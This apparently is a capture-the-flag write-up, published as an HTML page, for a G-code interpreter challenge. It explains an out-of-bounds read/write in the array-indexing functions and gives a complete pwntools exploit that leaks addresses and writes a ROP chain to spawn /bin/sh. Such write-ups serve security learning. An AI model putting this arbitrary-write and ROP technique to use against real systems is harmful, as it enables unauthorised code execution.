@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" type="text/css" href="../styles/style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <title>Responsive Website</title>
+</head>
+<body>
+  <div class="sidebar left">
+    <pre class="ascii-art" style="font-size: 0.4vw;">
+    ██▓▓                                                                                         
+      ▒▒▒░░░░░░░▒▓█                                                     ▒▒█▓▒▒▒░                 
+      ░ ░▒░▒░░░░░░░░░░░▓█                                            █████▒▓                     
+        ░░░▒░░░░▒▒▒░░░▒░░░░▒                                      ██▓█▓▓▓█                       
+        ░░░░░░░  ░░░░░▒▒ ░░░░░▒█                                ██▓▓█▒▒▓▓                        
+           ░░░ ░░░░░░░░░░░░▒▒▒░░ ▒█                           ███▓░█▓▒▓▓█                        
+             ░░░░░░░░░░░░░  ░░░░ ░  ▓ ▒█                    ██▓▓▓░▓▓█▓▓▓                         
+                 ░░░░░░░░░░░░░░░░░░   ░░░▓                ███▓▓█▓▓▒▓▒▓▓▓█████                    
+                  ░░░░░░░░░▒░░░░░░░ ▒▒░░ ░▒▓             █████▓▓█▒░▒▓▓█▓▓▒▓▓▒▒▓▓█                
+                    ░░░░░░░░░░░░░░░ ░░ ░░░░▒███        ▓▓███▓▓▒▒▒█▓▓▓███▒▓▒▒▒▒▒▒▓▓               
+                       ░░░░░░░░░░░░░░░░░░  ░ ▒█▓      ▓███▓▓██▓▓▓▓▓▓▓▒░▒ ░░░░░░▒▓▓               
+                      ▓▒▒▒ ░░░ ░░░░░░░░░░░░ ░ ░▓▓   ▓▒█░█▒▓▓▓▓▓▓█▓█▓ ██░░▒▓ ▓░░▒▒▓               
+                     ▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░▒█▒░░░▓█▓▓▓▓▓▒▓▓█▒▒█▒░░ ░░░░▒▒▒ ▒               
+                     ░░░▒ ░░░░░░░░░░░░░░ ░░░░ ░░░░▒▒▒░▒▓▓▒▓▓▓▓▒█░▓░░   ░░░░░░░▒▒░                
+                     ▒▒  ░░░▒  ░░░░▒░░░ ░░░░░░░░░░░░▒▒██▓▓▓▓▓█▓█▒▒░░░░░▒░░▒▒▒▒▓                  
+                      ░░░░░░░░▒░▒░░░░░ ░░░░░░░░░  ░░░▓██▓▓▓█▓  ▓▓░░ ░░░░░░▒░░▓                   
+                       ░░░░ ▒▒ ▒░░░░▒░░░ ░░░░░░░░ ░░   ▒░░░  █▓ ▒▓░▒░░░░░░▒▓                     
+                        ▓░░░░▒▒ ▒░░░ ░░░░░░░ ░░░░░  ░▒ ░░▓▓█░ ░▒░▓░▓ ░░▒▓                        
+                          ▒ ░░▒░▒░░     ░░░░░░░░░ ░ ░░░░▓▓▒░▓█ ░░▓▓ ░▓▓▓▓██                      
+                          █▒░░▓░▒    ░░░   ░░░░░░  ░░░▓▓▒▓▒▓░▒▓ ░ ▒▓▓▒▒ ▒▓░█                     
+                            ░▒▒▒▒░░░░░░░░ ░ ░░░░░░  ▒▓▒▒▓░▒▒▓ ▒▒░░▒▓▓▓▓▓▓ ░▓██                   
+                              █░░▒▒▒░░░░░ ░ ░░░░░  ▓▒▒▒▓ ░▒▒▓▓░▓▓ ▒▒▒▓▓▓███▒░██                  
+                               ▒░▒░░░░░░░░    ░░░▒░▒▒▒▓  ░░▒▒▓▓▒█▓░░▒▒▒▓▓█▒█▓▓▓                  
+                                   ▓▒░░ ░ ░    ░░▒▒▒▒▓   ░░▒▒▒▓▓░█░░▒▒▒▓▒▓▓▒ ▓██                 
+                                   ▒▒░░░ ░░   ▓▒▒▒░▒▓     ░▒▒▒░▓█ █░▒▒▒▒▓▒▓░▓▒░█                 
+                                    ░░░░░ ░░ ░░░▒░▒        ░▒▒▒▓███░▒▒▒▓░█▒░ ▒░▒▓█               
+                                    █▒░░░░ ░░░░░░░    ░ ░ ░░░▒▒▒▓█▓░▒▒▒░█▓▓▓░░▒▒▓▓▒              
+                                      ▒ ░░ ░░░░▒   ░░░░░ ░ ░░▒▒▒▒▓▓▒▒▒▓▒▓▓▒█▓▓░░░░               
+                                       ░░░░░░░     ░░░░░░░░ ░░▒▒▒▒▒▓▓▓▓▒▒▒█▓░░░░░                
+                                        ░░░░░░░  ░░░ ░ ░░░░░   ▒▒▒▒▒▒▓█▒▒▒▓▒░░▒▒                 
+                                        ░░░░░░░ ░░ ░░░░  ░░░░░░░░▒▒▒▒▒▒▓▓▒▒░░▓▓                  
+                                        ░░░░░░░  ░░░  ░  ░░░ ░░░░ ░░▒▒▒▒▒▓▓░▒▒▓                  
+                                        ░░░░░   ░░   ░   ░░░░░░░░▒▒▓▓▒░▒▒▒▒▒▒▓   ▓               
+                                         ░░░ ░░░░░░░░   ░░░░░░░░▒▒░▓▓░▒▒▓░▒▒░░░░░▒▒▓█            
+                                        ▒░░▒░░░▒░░░    ░░░░▒░░░▒▒░▓░▒░▒░▒▒▒░░░░░░░▒▒░▒           
+                                         ▒░▒░ ▒░░░    ▒▒▒░░░░▒▒▒▒▒▒░░░▒▒▒░░░░▒        ▒          
+                                          ▒▒░░▒░     ▒▒▒░▒▒▒▒▓░░▒▒▒░░▒░░▒▒░ ▒█                   
+                                            ░▓▒      ▒▒▓▓▒▒▒▒░▒▒▒░▒░░▒░▒▓▒░ ██                   
+                                                    ▓▒█░▒░▒▒▒▒▒░▒░░░▒░░░░░ ░▒░                   
+                                                    ░█▒▒░▒░ ▒▒▒░▒░░▒░▒░░░░ █▓██                  
+                                                   ▒▒▒▒▒░▒░▓░▒▒░▓░▒░▒░▒ ▒░░▒███                  
+                                                   ▒▒▒░░░▒▓▒▒▒▒▒▓░░▒░░ ░░░█▒████                 
+                                                 █▒░░░░░▒▒▒▒▒▒▒▒░░░░░░ ░░▒▒█▓█▓█                 
+                                                █░░░░▒░▒▓▒▒▒▒▒▒▓░░░ ░ ░░░▓▒▓▓███                 
+                                               ▓▒░░ ░░░▓░▒▒▒▒▒▓▓▒░░░  ░░▒▒▓▓▓▓██                 
+                                              ▓▒▒░ ░░░▒░░░▒▒▒▓▓▒▒░░  ░ ▒▓▓▓▓▓▓▓█                 
+                                             █▒▓░ ░░░▒░░░▒▒▓▓▓░▒▒░  ░ ░▓▓▒▓▓▓▓▓█                 
+                                            █▒▒░  ░░▒▒░░▒▒▓▓▓▓▒▒░ ░  ░▓▒▒▓▓▓▓▓▓█                 
+                                           █▓▒░  ░░▒▒░░░▒▒▒▓▓▒▒░░    ▓▒▓▒▒▒ ▓▓▓█                 
+                                           █▒▒   ░░░░░▒▒▒▒▒▓▓▒▒░░  ░▓▓▒▒▓▒▓▒▒▒▓█                 
+                                          █░▓░   ░░░░ ░▒▒▒▓▒░░░░░ ░▓▓▓▒▓▒░▒▒▒▒▒▓                 
+                                         █▓▒▒   ░▒░░░▒▒░▒▓▓▒▒░▒░ ░▓▓▒░▒▒▒▒░ ░▒▓█                 
+                                         █░░░ ░ ░░ ░░░▒▒▓▓▒░░░░  ░▓▒▒▒▒▒░░░ ▓▓▓                  
+                                        █▒▒▒░ ░ ▒░▒░▒░░▓▓▓░░░  ░▓▒▓▒▒▒░▒ ▒░ ▓██                  
+                                        ░▓▓▒ ░ ░░░░░░░▓▓▓▒░▒  ░▓░▒▒░▓░▒▒░░░▒▓▓█                  
+                                       █▓▒░▒░░ ░ ░░ ░░▓▓▒░▒  ░▓▒▒▓▒▒▒▒▒▒░▓ ▒▓▓                   
+                                         ▒▒░  ░░░░░  ▒▓▓▒░  ░░▒░░▓░▒▒░▒▒ ▓▒▒██                   
+                                           ▓▓░ ░░  ░▒▓▓▒░░░░░▒░░▒▓▒░░▒▒▒░▓▒▓██                   
+                                          █▒ ░░░░░░▒▒▓░░░░░░▒░░▒▒▒▒░▒░▒▒ ▓░░█                    
+                                          ▒░░ ░░░░░▒▒▒░░░░ ▒▒░░▒▓▒▒░▒▒░▒░█░██                    
+                                         █░▓░░░░▒▒░▒▒░░░░ ░▒░░▒▓▓▓░▒▒░░▒▒▓░▓                     
+                                         ▒░░░░░ ░ ▒▒▒░░░ ░▒░░░▒█▓▓░░▒▒░▒░▓▒█                     
+                                          ▒▓▒░░░░░▒▒▒░  ░░░░░░▒▓▓▓░▒▒▒▒▒░▒▒█                     
+                                           ░▓▒░░░▒▒▒░░ ░░░░░░░░▒░▓░░▓▒░▒▒░▓█                     
+                                            ▒░░░░▒▒▒░░░░░░░▒▒▒▒▓▒▒░░▒▒░▒▓░░                      
+                                             ▒▒▒▒▒▒▒░░░░░▒▒░░▓▓▓▒▒▓░▒▒ ░▒▒░                      
+                                             ▓█▓▓ ▒▒▓░▒░░▒░░▒▓█▓▓▒▓▓▒▓ ░░▒▒▒                     
+                                           ██▓██▓▒▒░░▒ ▒▒▒▒▒░█▓▓█▓▓██▒▓░░░▓█                     
+                                         ███████▒░▓░█▒░▒█▓▒▓▒█▒▒██▒░ ░█░░░▒▓░█                   
+                                       ████████▒░ ░█▓▒▓▓█▓█▓██▒▒▓▓▓▒░▓▓▒▒▒░░▒▒█                  
+    </pre>
+  </div>
+
+  <div class="content">
+    <h1 id="youwouldntdownloada3dprinter">youwouldntdownloada3dprinter</h1>
+    <p>The challenge provides a binary, a Python script, and a website. The Python script is used to visualize the results of G-code commands, while the website does not contain any useful information. The binary prompts the user to input a G-code command. By researching G-code documentation, I found <a href="https://marlinfw.org/meta/gcode/">this reference</a>. After fuzzing the binary with various G-code commands, I discovered that only the following commands are implemented:</p>
+    <pre><code>Code  Function
+    G0    Moves <span class="hljs-built_in">to</span> <span class="hljs-built_in">new</span> position <span class="hljs-keyword">without</span> extruding.
+    G1    Moves <span class="hljs-built_in">to</span> <span class="hljs-built_in">new</span> position <span class="hljs-keyword">while</span> extruding.
+    G28   Set position <span class="hljs-built_in">to</span> origin.
+    G90   Changes mode <span class="hljs-built_in">to</span> absolute positioning.
+    G91   Changes mode <span class="hljs-built_in">to</span> <span class="hljs-built_in">relative</span> positioning. 
+    G92   Moves <span class="hljs-built_in">to</span> <span class="hljs-built_in">new</span> position <span class="hljs-keyword">without</span> extruding.
+    M1    Indefinite pause (sleep).
+    M33   Prints <span class="hljs-keyword">the</span> path <span class="hljs-built_in">to</span> flag.
+    M82   Sets <span class="hljs-keyword">the</span> extruder mode <span class="hljs-built_in">to</span> absolute.
+    M83   Sets <span class="hljs-keyword">the</span> extruder mode <span class="hljs-built_in">to</span> <span class="hljs-built_in">relative</span>.
+    M84   Quit <span class="hljs-keyword">the</span> program (<span class="hljs-built_in">stop</span> motors).
+    M104  Sets <span class="hljs-keyword">the</span> extruder temperature.
+    M105  Reads <span class="hljs-keyword">the</span> current temperature <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> extruder, bed <span class="hljs-keyword">and</span> <span class="hljs-keyword">the</span> extruded <span class="hljs-built_in">value</span>.
+    M106  Turns <span class="hljs-keyword">the</span> fan <span class="hljs-keyword">on</span>. (<span class="hljs-title">useless</span>)
+    M107  Turns <span class="hljs-keyword">the</span> fan off. (useless)
+    M109  Waits <span class="hljs-keyword">until</span> <span class="hljs-keyword">the</span> extruder temperature reaches <span class="hljs-keyword">the</span> <span class="hljs-built_in">set</span> <span class="hljs-built_in">value</span>. (useless)
+    M140  Sets <span class="hljs-keyword">the</span> heated bed temperature. (useless)
+    M190  Waits <span class="hljs-keyword">until</span> <span class="hljs-keyword">the</span> bed temperature is reached. (useless)
+    </code></pre><p>After some testing, I found that most commands do nothing. However, after using <code>G0 X999 Y999 Z999</code> and <code>M105</code>, I encountered a segmentation fault. Since this seemed interesting, I decided to reverse engineer the binary using IDA Pro, where I identified the following function causing the segmentation fault:</p>
+    <pre><code class="lang-c">__int64 *__<span class="hljs-function">fastcall <span class="hljs-title">read_array</span>(<span class="hljs-params">__int64 *<span class="hljs-keyword">out</span>, __int64 *pos</span>)
+    </span>{
+      __int64 *result; <span class="hljs-comment">// rax</span>
+      <span class="hljs-keyword">char</span> <span class="hljs-keyword">value</span>; <span class="hljs-comment">// cl</span>
+    
+      result = <span class="hljs-keyword">out</span>;
+      <span class="hljs-keyword">value</span> = *(_BYTE *)(<span class="hljs-number">62500</span> * pos[<span class="hljs-number">0</span>] + <span class="hljs-number">250</span> * pos[<span class="hljs-number">1</span>] + pos[<span class="hljs-number">2</span>] + pos[<span class="hljs-number">7</span>]);
+      *(_WORD *)<span class="hljs-keyword">out</span> = <span class="hljs-number">0</span>;
+      *((_BYTE *)<span class="hljs-keyword">out</span> + <span class="hljs-number">2</span>) = <span class="hljs-keyword">value</span>;
+      <span class="hljs-keyword">return</span> result;
+    }
+    </code></pre>
+    <p>We can cleary see that the function is reading 1 byte from an array with dimensions of 250x250x250 using the position set by <code>G0</code> or <code>G1</code>. After more testing, i also found out that using <code>G1</code> in coordinates out of the array boundaries caused a segfault, leading to this function:</p>
+    <pre><code class="lang-c">__int64 __fastcall add_array(__int64 *pos, char value)
+    {
+      __int64 addr; <span class="hljs-comment">// [rsp+18h] [rbp-20h]</span>
+      _BYTE read_value[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+34h] [rbp-4h] BYREF</span>
+    
+      addr = <span class="hljs-number">62500</span> * pos[<span class="hljs-number">0</span>] + <span class="hljs-number">250</span> * pos[<span class="hljs-number">1</span>] + pos[<span class="hljs-number">2</span>] + pos[<span class="hljs-number">7</span>];
+      read_array((__int64)read_value, pos);
+      *(_BYTE *)(addr) = value + read_value[<span class="hljs-number">2</span>];
+      return <span class="hljs-number">0</span>;
+    }
+    </code></pre>
+    <p>The function calls <code>read_array</code>, reading the value stored at coordinate, then adding the desired value to the read value and storing the result at the same position.
+    By using <code>G1</code> and <code>M105</code> we can prove that behaviour:</p>
+    <pre><code> &gt; <span class="hljs-selector-tag">Enter</span> <span class="hljs-selector-tag">G-code</span>:
+    <span class="hljs-selector-tag">G1</span> <span class="hljs-selector-tag">X0</span> <span class="hljs-selector-tag">Y0</span> <span class="hljs-selector-tag">Z0</span> <span class="hljs-selector-tag">E5</span>
+     &gt; <span class="hljs-selector-tag">Linearly</span> <span class="hljs-selector-tag">setting</span> <span class="hljs-selector-tag">position</span> <span class="hljs-selector-tag">to</span> (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-selector-tag">0</span>
+    <span class="hljs-selector-tag">M105</span>      
+     &gt; <span class="hljs-selector-tag">ok</span> <span class="hljs-selector-tag">T</span><span class="hljs-selector-pseudo">:0</span> <span class="hljs-selector-tag">B</span><span class="hljs-selector-pseudo">:0</span> <span class="hljs-selector-tag">V</span><span class="hljs-selector-pseudo">:5</span>
+    <span class="hljs-selector-tag">G1</span> <span class="hljs-selector-tag">X0</span> <span class="hljs-selector-tag">Y0</span> <span class="hljs-selector-tag">Z0</span> <span class="hljs-selector-tag">E1</span>
+     &gt; <span class="hljs-selector-tag">Linearly</span> <span class="hljs-selector-tag">setting</span> <span class="hljs-selector-tag">position</span> <span class="hljs-selector-tag">to</span> (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-selector-tag">0</span>
+    <span class="hljs-selector-tag">M105</span>
+     &gt; <span class="hljs-selector-tag">ok</span> <span class="hljs-selector-tag">T</span><span class="hljs-selector-pseudo">:0</span> <span class="hljs-selector-tag">B</span><span class="hljs-selector-pseudo">:0</span> <span class="hljs-selector-tag">V</span><span class="hljs-selector-pseudo">:6</span>
+    </code></pre><p>We can see that <code>G1</code> is adding the value to the coordinate, which we can read throught the value outputted by <code>M105</code> (<code>V:[value]</code>).</p>
+    <p>With all that in mind, we can read and write to any memory address by using <code>G0</code>, <code>G1</code> and <code>M105</code>. For exploiting this, i used IDA debugger again for finding address leaks on the <code>.bss</code> section (the same section of the array), making it possible to write a rop chain for calling <code>execve(&quot;/bin/sh&quot;)</code> and ovewriting some arbitrary function return address with the chain.</p>
+    <p>Finding the gadgets for the chain was pretty easy, since the binary is statically linked with <a href="https://musl.libc.org/">MUSL</a> libc. Since we can only write 1 byte at a time, we cant rely on functions that return every time we input data or read/write values, so, for picking the right function to overwrite its return address, i just picked one on the bottom of the stack.</p>
+    <p>Final exploit:</p>
+    <pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/env python3</span>
+    <span class="hljs-comment"># -*- coding: utf-8 -*-</span>
+    <span class="hljs-comment"># This exploit template was generated via:</span>
+    <span class="hljs-comment"># $ pwn template ./youwouldntdownloada3dprinter</span>
+    <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+    
+    <span class="hljs-comment"># Set up pwntools for the correct architecture</span>
+    exe = context.binary = ELF(args.EXE <span class="hljs-keyword">or</span> <span class="hljs-string">'./youwouldntdownloada3dprinter'</span>)
+    
+    <span class="hljs-comment"># Many built-in settings can be controlled on the command-line and show up</span>
+    <span class="hljs-comment"># in "args".  For example, to dump all data sent/received, and disable ASLR</span>
+    <span class="hljs-comment"># for all created processes...</span>
+    <span class="hljs-comment"># ./exploit.py DEBUG NOASLR</span>
+    
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start</span><span class="hljs-params">(argv=[], *a, **kw)</span>:</span>
+        <span class="hljs-string">'''Start the exploit against the target.'''</span>
+        <span class="hljs-keyword">if</span> args.GDB:
+            <span class="hljs-keyword">return</span> gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-keyword">return</span> process([exe.path] + argv, *a, **kw)
+    
+    <span class="hljs-comment"># Specify your GDB script here for debugging</span>
+    <span class="hljs-comment"># GDB will be launched if the exploit is run via e.g.</span>
+    <span class="hljs-comment"># ./exploit.py GDB</span>
+    gdbscript = <span class="hljs-string">'''
+    continue
+    '''</span>.format(**locals())
+    
+    <span class="hljs-comment">#===========================================================</span>
+    <span class="hljs-comment">#                    EXPLOIT GOES HERE</span>
+    <span class="hljs-comment">#===========================================================</span>
+    <span class="hljs-comment"># Arch:       amd64-64-little</span>
+    <span class="hljs-comment"># RELRO:      Full RELRO</span>
+    <span class="hljs-comment"># Stack:      No canary found</span>
+    <span class="hljs-comment"># NX:         NX enabled</span>
+    <span class="hljs-comment"># PIE:        PIE enabled</span>
+    
+    <span class="hljs-comment"># python version 3.13.2</span>
+    <span class="hljs-comment"># pwntools version 4.14.0</span>
+    
+    io = start()
+    
+    <span class="hljs-comment"># Read byte at coordinate (x, y, z)</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_xyz</span><span class="hljs-params">(x, y, z)</span>:</span>
+      <span class="hljs-comment"># Uses the G0 command to move to the specified coordinates</span>
+      <span class="hljs-comment"># and the M105 command to read value at the current position</span>
+      payload = <span class="hljs-string">b""</span>
+      payload += f<span class="hljs-string">"G0 X{x} Y{y} Z{z}\n"</span>.encode()
+      payload += <span class="hljs-string">b"M105"</span>
+    
+      <span class="hljs-comment"># G0 X[z] Y[y] Z[z]</span>
+      <span class="hljs-comment">#  &gt; Rapidly setting position to ([x], [y], [z]) 0</span>
+      <span class="hljs-comment"># M105</span>
+      <span class="hljs-comment">#  &gt; ok T:0 B:0 V:[value]</span>
+    
+      io.sendline(payload)
+      io.recvuntil(<span class="hljs-string">b"V:"</span>)
+      <span class="hljs-keyword">return</span> int(io.recvline().strip())
+    
+    <span class="hljs-comment"># Read byte at offset</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_byte</span><span class="hljs-params">(offset)</span>:</span>
+      <span class="hljs-keyword">return</span> read_xyz(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, offset)
+    
+    <span class="hljs-comment"># Read 64 bit value at offset</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_64</span><span class="hljs-params">(offset)</span>:</span>
+      value = <span class="hljs-number">0</span>
+      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):
+        byte = read_byte(offset + i)
+        value |= (byte &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; (i * <span class="hljs-number">8</span>)
+      <span class="hljs-keyword">return</span> value
+    
+    <span class="hljs-comment"># Add a byte value at coordinate (x, y, z)</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_xyze</span><span class="hljs-params">(x, y, z, e)</span>:</span>
+      <span class="hljs-comment"># Uses the G0 command to move to the specified coordinates</span>
+      <span class="hljs-comment"># and the G1 command to write value at the same position</span>
+      payload = <span class="hljs-string">b""</span>
+      payload += f<span class="hljs-string">"G0 X{x} Y{y} Z{z}\n"</span>.encode()
+      payload += f<span class="hljs-string">"G1 X{x} Y{y} Z{z} E{e}"</span>.encode()
+    
+      <span class="hljs-comment"># G0 X[x] Y[y] Z[z]</span>
+      <span class="hljs-comment">#  &gt; Rapidly setting position to ([x], [y], [z]) 0</span>
+      <span class="hljs-comment"># G1 X[x] Y[y] Z[z] E[e]</span>
+      <span class="hljs-comment">#  &gt; Linearly setting position to ([x], [y], [z]) 0</span>
+    
+      io.sendline(payload)
+    
+    <span class="hljs-comment"># Write byte at offset</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_byte</span><span class="hljs-params">(offset, value)</span>:</span>
+      <span class="hljs-comment"># Sums the difference between the previous byte and the new byte  </span>
+      prev_byte = read_byte(offset)
+      <span class="hljs-keyword">if</span> (prev_byte == value):
+        <span class="hljs-keyword">return</span>
+    
+      <span class="hljs-keyword">if</span> (prev_byte &gt; value):
+        new_byte = <span class="hljs-number">0x100</span> - prev_byte + value
+      <span class="hljs-keyword">else</span>:
+        new_byte = value - prev_byte
+    
+      add_xyze(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, offset, new_byte)
+    
+    <span class="hljs-comment"># Write bytes starting from offset</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_bytes</span><span class="hljs-params">(offset, data)</span>:</span>
+      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(data)):
+        write_byte(offset + i, data[i])
+    
+    <span class="hljs-comment"># Write 64 bit value at offset</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_64</span><span class="hljs-params">(offset, value)</span>:</span>
+      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):
+        value_byte = (value &gt;&gt; (i * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>      
+        write_byte(offset + i, value_byte)
+    
+    io.recvuntil(<span class="hljs-string">b"&gt; Enter G-code:\n"</span>)
+    
+    text_leak = read_64(<span class="hljs-number">0xEE6B28</span>) <span class="hljs-comment"># offset for a .text address  </span>
+    stack_leak = read_64(<span class="hljs-number">-0x8</span>) <span class="hljs-comment"># offset for a stack address</span>
+    
+    elf_base = text_leak - <span class="hljs-number">0x18D60</span> <span class="hljs-comment"># elf base address</span>
+    array_base = elf_base + <span class="hljs-number">0x50008</span> <span class="hljs-comment"># base address used for the binary reading and writing operations</span>
+    target_addr = stack_leak - <span class="hljs-number">0xF8</span> <span class="hljs-comment"># return address for an arbitrary function, target address for placing the ROP chain</span>
+    
+    exe.address = elf_base
+    rop_chain = ROP(exe, base=target_addr)
+    
+    <span class="hljs-comment"># Build the rop chain for execve("/bin/sh"),</span>
+    <span class="hljs-comment"># used raw syscall gadget to prevent pwntools from using sigreturn</span>
+    syscall = rop_chain.find_gadget([<span class="hljs-string">"syscall"</span>, <span class="hljs-string">"ret"</span>])[<span class="hljs-number">0</span>]
+    
+    rop_chain.rax = constants.SYS_execve
+    rop_chain.rdi = array_base <span class="hljs-comment"># address of "/bin/sh"</span>
+    rop_chain.rsi = <span class="hljs-number">0</span>
+    rop_chain.rdx = <span class="hljs-number">0</span>
+    rop_chain.raw(syscall)
+    
+    write_bytes(<span class="hljs-number">0</span>, <span class="hljs-string">b"/bin/sh"</span>) <span class="hljs-comment"># write "/bin/sh" string to the array base</span>
+    write_bytes(target_addr - array_base, rop_chain.chain()) <span class="hljs-comment"># write the rop chain to the target address</span>
+    
+    <span class="hljs-comment"># Command for finishing the execution, triggering the rop chain</span>
+    io.sendline(<span class="hljs-string">b"M84"</span>)
+    io.recvuntil(<span class="hljs-string">b"\n"</span>)
+    
+    log.success(<span class="hljs-string">"Got shell"</span>)
+    io.interactive()
+    </code></pre>
+    <p>After obtaining the shell, I simply printed the flag using the <code>cat /flag</code> command. The flag&#39;s path was revealed earlier through the <code>M33</code> command.</p>
+  </div>
+
+  <div class="sidebar right">
+    <pre class="ascii-art" style="font-size: 0.4vw;">
+                                                                              ▓▓██    
+      ░▒▒▒▓█▒▒                                                     █▓▒░░░░░░░▒▒▒      
+          ▓▒█████                                            █▓░░░░░░░░░░░▒░▒░ ░      
+            █▓▓▓█▓██                                      ▒░░░░▒░░░▒▒▒░░░░▒░░░        
+             ▓▓▒▒█▓▓██                                █▒░░░░░ ▒▒░░░░░  ░░░░░░░        
+             █▓▓▒▓█░▓███                           █▒ ░░▒▒▒░░░░░░░░░░░░ ░░░           
+              ▓▓▓█▓▓░▓▓▓██                    █▒ ▓  ░ ░░░░  ░░░░░░░░░░░░░             
+         █████▓▓▓▒▓▒▓▓█▓▓███                ▓░░░   ░░░░░░░░░░░░░░░░░░                 
+     █▓▓▒▒▓▓▒▓▓█▓▓▒░▒█▓▓█████             ▓▒░ ░░▒▒ ░░░░░░░▒░░░░░░░░░                  
+    ▓▓▒▒▒▒▒▒▓▒███▓▓▓█▒▒▒▓▓███▓▓        ███▒░░░░ ░░ ░░░░░░░░░░░░░░░                    
+    ▓▓▒░░░░░░ ▒░▒▓▓▓▓▓▓▓██▓▓███▓      ▓█▒ ░  ░░░░░░░░░░░░░░░░░░                       
+    ▓▒▒░░▓ ▓▒░░██ ▓█▓█▓▓▓▓▓▓▒█░█▒▓   ▓▓░ ░ ░░░░░░░░░░░░ ░░░ ▒▒▒▓                      
+    ▒ ▒▒▒░░░░ ░░▒█▒▒█▓▓▒▓▓▓▓▓█▓░░░▒█▒░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒                     
+     ░▒▒░░░░░░░   ░░▓░█▒▓▓▓▓▒▓▓▒░▒▒▒░░░░ ░░░░ ░░░░░░░░░░░░░░ ▒░░░                     
+       ▓▒▒▒▒░░▒░░░░░▒▒█▓█▓▓▓▓▓██▒▒░░░░░░░░░░░░ ░░░▒░░░░  ▒░░░  ▒▒                     
+        ▓░░▒░░░░░░ ░░▓▓  ▓█▓▓▓██▓░░░  ░░░░░░░░░ ░░░░░▒░▒░░░░░░░░                      
+          ▓▒░░░░░░▒░▓▒ ▓█  ░░░▒   ░░ ░░░░░░░░ ░░░▒░░░░▒ ▒▒ ░░░░                       
+             ▓▒░░ ▓░▓░▒░ ░█▓▓░░ ▒░  ░░░░░ ░░░░░░░ ░░░▒ ▒▒░░░░▓                        
+           ██▓▓▓▓░ ▓▓░░ █▓░▒▓▓░░░░ ░ ░░░░░░░░░     ░░▒░▒░░ ▒                          
+          █░▓▒ ▒▒▓▓▒ ░ ▓▒░▓▒▓▒▓▓░░░  ░░░░░░   ░░░    ▒░▓░░▒█                          
+        ██▓░ ▓▓▓▓▓▓▒░░▒▒ ▓▒▒░▓▒▒▓▒  ░░░░░░ ░ ░░░░░░░░▒▒▒▒░                            
+       ██░▒███▓▓▓▒▒▒ ▓▓░▓▓▒▒░ ▓▒▒▒▓  ░░░░░ ░ ░░░░░▒▒▒░░█                              
+       ▓▓▓█▒█▓▓▒▒▒░░▓█▒▓▓▒▒░░  ▓▒▒▒░▒░░░    ░░░░░░░░▒░▒                               
+      ██▓ ▒▓▓▒▓▒▒▒░░█░▓▓▒▒▒░░   ▓▒▒▒▒░░    ░ ░ ░░▒▓                                   
+      █░▒▓░▓▒▓▒▒▒▒░█ █▓░▒▒▒░     ▓▒░▒▒▒▓   ░░ ░░░▒▒                                   
+    █▓▒░▒ ░▒█░▓▒▒▒░███▓▒▒▒░        ▒░▒░░░ ░░ ░░░░░                                    
+   ▒▓▓▒▒░░▓▓▓█░▒▒▒░▓█▓▒▒▒░░░ ░ ░    ░░░░░░░ ░░░░▒█                                    
+    ░░░░▓▓█▒▓▓▒▓▒▒▒▓▓▒▒▒▒░░ ░ ░░░░░   ▒░░░░ ░░ ▒                                      
+     ░░░░░▓█▒▒▒▓▓▓▓▒▒▒▒▒░░ ░░░░░░░░     ░░░░░░░                                       
+      ▒▒░░▒▓▒▒▒█▓▒▒▒▒▒▒   ░░░░░ ░ ░░░  ░░░░░░░                                        
+       ▓▓░░▒▒▓▓▒▒▒▒▒▒░░░░░░░░  ░░░░ ░░ ░░░░░░░                                        
+       ▓▒▒░▓▓▒▒▒▒▒░░ ░░░░ ░░░  ░  ░░░  ░░░░░░░                                        
+    ▓   ▓▒▒▒▒▒▒░▒▓▓▒▒░░░░░░░░   ░   ░░   ░░░░░                                        
+ █▓▒▒░░░░░▒▒░▓▒▒░▓▓░▒▒░░░░░░░░   ░░░░░░░░ ░░░                                         
+▒░▒▒░░░░░░░▒▒▒░▒░▒░▓░▒▒░░░▒░░░░    ░░░▒░░░▒░░▒                                        
+▒        ▒░░░░▒▒▒░░░▒▒▒▒▒▒░░░░▒▒▒    ░░░▒ ░▒░▒                                         
+        █▒ ░▒▒░░▒░░▒▒▒░░▓▒▒▒▒░▒▒▒     ░▒░░▒▒                                          
+        ██ ░▒▓▒░▒░░▒░▒▒▒░▒▒▒▒▓▓▒▒      ▒▓░                                            
